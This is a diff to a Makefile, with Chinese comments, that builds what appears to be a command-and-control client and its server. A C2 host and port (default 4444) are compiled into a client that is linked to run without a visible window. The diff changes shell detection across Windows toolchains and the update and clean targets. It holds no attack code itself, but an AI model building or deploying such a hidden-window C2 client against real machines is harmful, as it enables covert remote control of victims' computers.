@@ -7,28 +7,22 @@ BIN = $(C_TARGET)
 SBIN = $(S_TARGET)
 l = ""
 
-.PHONY: all clean client server
+.PHONY: all clean update
 
 L = (
 R = )
 
-# 如果是msys，需要特殊处理
-ifeq ($(shell uname -s),MSYS_NT)
-P = /
-I = ^
-else
-P =
-I =
-endif
+
+# 清除编译产物
 
 
 define wininput
 ifeq ($(C2_IP_DOMAIN),)
-C2_IP_DOMAIN := $(shell cmd $(P)/v:on $(P)/c "$(L)set t=127.0.0.1$(R) $(I)& set /p t=IP or Domain$(L)127.0.0.1$(R): >con & echo.!t!")
+C2_IP_DOMAIN := $(shell cmd /v:on /c "$(L)set t=127.0.0.1$(R) $(I)& set /p t=IP or Domain$(L)127.0.0.1$(R): >con & echo.!t!")
 endif
 
 ifeq ($(C2_PORT),)
-C2_PORT := $(shell cmd $(P)/v:on $(P)/c "$(L)set t=4444$(R) $(I)& set /p t=PORT$(L)4444$(R): >con & echo.!t!")
+C2_PORT := $(shell cmd /v:on /c "$(L)set t=4444$(R) $(I)& set /p t=PORT$(L)4444$(R): >con & echo.!t!")
 endif
 endef
 
@@ -50,28 +44,40 @@ else
 CC := gcc
 endif
 
+# 检查是否有 rm，有则用 rm，没有则用 cmd的erase
+ifneq ($(findstring rm,$(shell where rm 2> .nn)),)
+CLL := sh -c "rm -rf ./nn ./.nn"
+else
+CLL := cmd /c erase /f /q .\nn .\.nn
+endif
 
 all: $(C_SRC) $(S_SRC)
 ifeq ($(OS),Windows_NT) # Windows
-	$(eval $(call wininput))
-	@cmd $(P)/c erase $(P)/f $(P)/q .\.nn .\nn
+
 ifneq ($(findstring Microsoft,$(shell $(CC) /? 2>&1)),) # Microsoft Visual Studio (MSVC)
+	$(eval $(call wininput))
+	@cmd /c erase /f /q .\.nn .\nn
 	$(CC) $(C_SRC) /Fe:$(BIN).exe /O1 /DNDEBUG /DC2_IP_DOMAIN=\"$(C2_IP_DOMAIN)\" /DC2_PORT=$(C2_PORT) /link /subsystem:windows ws2_32.lib
 
 	$(CC) $(S_SRC) /Fe:$(SBIN).exe /O1 /DNDEBUG /link ws2_32.lib
 else
-ifeq ($(findstring MSYS_NT,$(shell uname -s)),MSYS_NT) # MSYS/MSYS2
-	@echo 稍后会进入cmd终端里请输入exit来退出
+ifneq ($(findstring MINGW64_NT,$(shell uname -s))$(findstring MINGW32_NT,$(shell uname -s))$(findstring MSYS_NT,$(shell uname -s)),) # MSYS/MSYS2
+	$(eval $(call uninput))
+	@$(CLL)
 	$(CC) $(C_SRC) -o $(BIN) -Os -s -lws2_32 -mwindows -DC2_IP_DOMAIN=\"$(C2_IP_DOMAIN)\" -DC2_PORT=$(C2_PORT)
 
 	$(CC) $(S_SRC) -o $(SBIN) -Os -s -lws2_32
 endif
 ifeq ($(findstring Windows_NT,$(shell uname -s)),Windows_NT) # W32/64devkit
+	$(eval $(call wininput))
+	@cmd /c erase /f /q .\.nn .\nn
 	$(CC) $(C_SRC) -o $(BIN) -Os -s -lws2_32 -mwindows -DC2_IP_DOMAIN=\"$(C2_IP_DOMAIN)\" -DC2_PORT=$(C2_PORT)
 
 	$(CC) $(S_SRC) -o $(SBIN) -Os -s -lws2_32
 endif
 ifeq ($(findstring CYGWIN_NT,$(shell uname -s)),CYGWIN_NT) # Cygwin
+	$(eval $(call wininput))
+	@cmd /c erase /f /q .\.nn .\nn
 	$(CC) $(C_SRC) -o $(BIN) -Os -s -mwindows -DC2_IP_DOMAIN=\"$(C2_IP_DOMAIN)\" -DC2_PORT=$(C2_PORT)
 
 	$(CC) $(S_SRC) -o $(SBIN) -Os -s
@@ -164,9 +170,13 @@ endif
 
 update:
 ifeq ($(OS),Windows_NT)
+ifneq ($(findstring MINGW64_NT,$(shell uname -s))$(findstring MINGW32_NT,$(shell uname -s))$(findstring MSYS_NT,$(shell uname -s)),) # MSYS/MSYS2 需要
+	@sh -c "which git > /dev/null 2>&1 && (git pull && echo Update complete) || echo Git not detected, please update manually"
+	@sh -c "rm -rf ./nn ./.nn"
+endif
 	@# 检测有没有git
-	@cmd $(P)/c "where git >nul 2>&1 && (git pull && echo Update complete) || echo Git not detected, please update manually"
-	@cmd $(P)/c erase $(P)/f $(P)/q .\.nn .\nn
+	@cmd /c "where git >nul 2>&1 && (git pull && echo Update complete) || echo Git not detected, please update manually"
+	@cmd /c erase /f /q .\.nn .\nn
 else
 	@# 检测有没有git
 	@sh -c "which git > /dev/null 2>&1 && (git pull && echo Update complete) || echo Git not detected, please update manually"
@@ -176,8 +186,12 @@ endif
 
 clean:
 ifeq ($(OS),Windows_NT)
-	@cmd $(P)/c erase $(P)/f $(P)/q .\.nn .\nn
-	@cmd $(P)/c erase $(P)/f $(P)/q $(BIN) $(BIN).* $(SBIN) $(SBIN).*
+ifneq ($(findstring MINGW64_NT,$(shell uname -s))$(findstring MINGW32_NT,$(shell uname -s))$(findstring MSYS_NT,$(shell uname -s)),) # MSYS/MSYS2 需要
+	@sh -c "rm -rf ./nn ./.nn"
+	@sh -c "rm -rf $(BIN) $(BIN).* $(SBIN) $(SBIN).*"
+endif
+	@cmd /c erase /f /q .\.nn .\nn
+	@cmd /c erase /f /q $(BIN) $(BIN).* $(SBIN) $(SBIN).*
 else
 	@sh -c "rm -rf ./nn ./.nn"
 	@sh -c "rm -rf $(BIN) $(BIN).* $(SBIN) $(SBIN).*"
